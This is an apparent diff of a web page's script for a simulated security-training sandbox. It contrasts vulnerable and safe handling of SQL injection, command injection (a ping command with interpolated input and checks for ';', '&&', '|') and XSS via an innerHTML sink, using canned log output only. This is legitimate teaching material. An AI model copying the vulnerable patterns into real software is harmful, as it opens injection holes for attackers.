+            logs.push(`[WARNING] Query structure altered! Logic evaluator bypassed.`);
+            logs.push(`[DATABASE] Executing query: returning ALL records due to OR condition.`);
+            result = { status: 'compromised', output: 'DB_OUTPUT: logged_in_user=admin, status=Administrator, records_returned=18' };
+          } else {
+            logs.push(`[DATABASE] Executing query: searching user '${input}'.`);
+            result = { status: 'safe', output: `DB_OUTPUT: user_found=false, records_returned=0` };
+          }
+        } else {
+          logs.push(`[BACKEND] Preparing SQL statement: SELECT * FROM users WHERE username = ?`);
+          logs.push(`[BACKEND] Binding parameter string: "${input}"`);
+          logs.push(`[DATABASE] Executing query safely. Input treated strictly as scalar data.`);
+          result = { status: 'safe', output: `DB_OUTPUT: user_found=false, records_returned=0 (Zero SQL structure alterations)` };
+        }
+      } else if (id === 'command-injection') {
+        if (mode === 'vulnerable') {
+          logs.push(`[BACKEND] Executing shell command: ping -c 3 ${input}`);
+          logs.push(`[SHELL] Invoking system terminal interpreter...`);
+          if (input.includes(';') || input.includes('&&') || input.includes('|')) {
+            logs.push(`[WARNING] Command separator detected! Processing secondary system calls.`);
+            logs.push(`[SHELL] Running secondary system call: whoami`);
+            result = { status: 'compromised', output: 'SYS_OUTPUT:\nPing completed.\nUser Context: root (System Administrator privilege)' };
+          } else {
+            logs.push(`[SHELL] Executing ping safely.`);
+            result = { status: 'safe', output: `SYS_OUTPUT:\nPing completed successfully to ${input}` };
+          }
+        } else {
+          logs.push(`[BACKEND] Sanitizing IP parameter check-bounds...`);
+          logs.push(`[BACKEND] Neutralized shell commands metacharacters.`);
+          logs.push(`[SHELL] Executing command: ping -c 3 ${input}`);
+          result = { status: 'safe', output: `SYS_OUTPUT:\nPing completed successfully to ${input}` };
+        }
+      } else {
+        logs.push(`[BACKEND] Processing input context...`);
+        if (mode === 'vulnerable') {
+          logs.push(`[WARNING] Script characters rendered directly inside browser DOM innerHTML sink.`);
+          result = { status: 'compromised', output: `DOM_OUTPUT: Rendered HTML input node containing potentially executing script events.` };
+        } else {
+          logs.push(`[BACKEND] Input escaped using HTML entities.`);
+          logs.push(`[DOM] Content written securely as text node.`);
+          result = { status: 'safe', output: `DOM_OUTPUT: Neutralized plain text save complete.` };
+        }
+      }
+
+      logs.push(`[SYSTEM] Transaction parsing finalized.`);
+
+      // Stream logs line by line
+      let idx = 0;
+      const interval = setInterval(() => {
+        sandboxLogs.push(logs[idx]);
+        idx++;
+        renderPage();
+        
+        if (idx >= logs.length) {
+          clearInterval(interval);
+          sandboxResult = result;
+          isSimulating = false;
+          renderPage();
+        }
+      }, 200);
+    };
+  </script>
+
+</body>
+</html>
